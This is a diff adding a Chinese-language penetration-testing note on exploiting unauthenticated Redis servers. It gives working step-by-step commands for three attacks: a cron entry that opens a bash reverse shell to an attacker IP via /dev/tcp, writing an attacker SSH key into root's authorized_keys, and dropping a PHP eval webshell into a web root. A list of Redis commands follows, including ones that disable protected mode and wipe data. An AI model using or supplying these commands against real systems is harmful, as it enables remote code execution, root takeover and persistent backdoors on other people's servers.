@@ -1,0 +1,75 @@
+redis是一个key-value存储系统,旧版本存在严重的未授权访问，可以实现写shell，写公钥，写计划任务反弹shell，从而实现rce.
+Redis 2.x，3.x，4.x，5.x
+
+Redis 漏洞利用
+ 1 利用计划任务反弹shell
+ vps开监听：nc -nvlp 2333
+ 远程连接Redis服务器并写入反弹Payload
+ redis-cli -h ip -p 6379 -a passwd   # 外部连接，或者你直接用天狐里的梭哈工具；
+ 链接后，再目标机器中执行：
+// 设置key
+set xxx "\n\n* * * * * bash -i>& /dev/tcp/192.168.253.128/2333 0>&1\n\n"
+//添加名为xxx的key，值为后面反弹shell的语句,5个星号代表每分钟执行一次，其中的\n同样是为了换行，避免crontab的语法错误。
+这里你也可以去不加\n，去看看乱码，踩个坑才能印象深刻
+// 设置路径
+config set dir /var/spool/cron/
+// 设置文件名
+config set dbfilename root
+// 保存key值到root文件中
+save
+然后等待成功就行了
+
+2 利用写入公钥登录ssh
+1 vps生成公钥：
+// 生成公私钥
+ssh-keygen -t rsa
+// 防止乱码,导出key
+(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > key.txt
+// 导入内容
+cat key.txt| redis-cli -h 192.168.253.135 -x set putsshkey
+2 远程连接Redis服务器并写入公钥
+连接后在目标主机执行：
+// 设置路径
+config set dir /root/.ssh     
+// 设置文件名
+config set dbfilename authorized_keys
+// 保存key值到root文件中
+save
+3 vps 远程登录目标系统
+ssh -i id_rsa root@192.168.253.135
+3 利用写入WEBShell连接远程服务器
+config set dir /www/admin/localhost_80/wwwroot
+config set dbfilename webshell.php
+set x '<?php @eval($_GET["cmd"]);phpinfo();?>'
+save
+蚁剑连接
+
+利用条件：
+知道网站根目录绝对路径（实际渗透过程中，这个方法通常需要搭配 phpinfo() 等方法使用。）
+无需是 root 起的 Redis
+可适用于 Windows（非 ssh 连接）
+一般无需 flushall 清空数据库（一定情况下也需要）
+
+
+常用命令
+1.redis-cli -h ip -p 6379 -a passwd   # 外部连接,Redis 的连接除了通过指定 IP，也可以通过指定域名，passwd可以为空（没设置密码时）
+2.info 																# 查看相关redis信息
+3.set xz "Hacker"                     # 设置键xz的值为字符串Hacker
+4.get xz                              # 获取键xz的内容
+5.INCR score                          # 使用INCR命令将score的值增加1
+6.keys *                              # 列出当前数据库中所有的键
+7.config set protected-mode no        # 关闭安全模式
+8.get anotherkey                      # 获取一个不存在的键的值
+9.config set dir /root/redis          # 设置保存目录
+10.config set dbfilename redis.rdb     # 设置保存文件名
+11.config get dir                      # 查看保存目录
+12.config get dbfilename               # 查看保存文件名
+13.save                                # 进行一次备份操作
+14.flushall                            # 删除所有数据
+15.del key                             # 删除键为key的数据
+16.slaveof ip port   					# 设置主从关系
+使用SET和GET命令，可以完成基本的赋值和取值操作；
+Redis是不区分命令的大小写的，set和SET是同一个意思；
+使用keys *可以列出当前数据库中的所有键；
+当尝试获取一个不存在的键的值时，Redis会返回空，即(nil)；
+如果键的值中有空格，需要使用双引号括起来，如"Hello World";
